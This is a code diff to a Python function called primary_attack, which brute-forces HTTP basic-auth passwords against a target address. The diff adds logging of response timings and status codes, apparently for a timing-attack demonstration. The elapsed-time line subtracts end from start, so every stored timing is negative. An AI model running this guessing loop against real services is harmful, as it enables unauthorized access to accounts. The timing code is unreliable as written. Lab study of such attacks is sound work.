@@ -29,12 +29,22 @@ def primary_attack(address, digits, username):
         username = what username to use in the attack
     """
     elapsed_time = 0
+    timings = []
+    data = {}
     passwords = password_generator(digits)
     for password in passwords:
         start = time.perf_counter()
         req = requests.post(address, auth=(username, password))
         end = time.perf_counter()
         elapsed_time = start - end
+        data['time'] = elapsed_time
+        data['code'] = req.status_code
+        timings.append(data)
+        if req.ok == True:
+            return timings
+        data = {}
+
+
 
 
 def create_app():
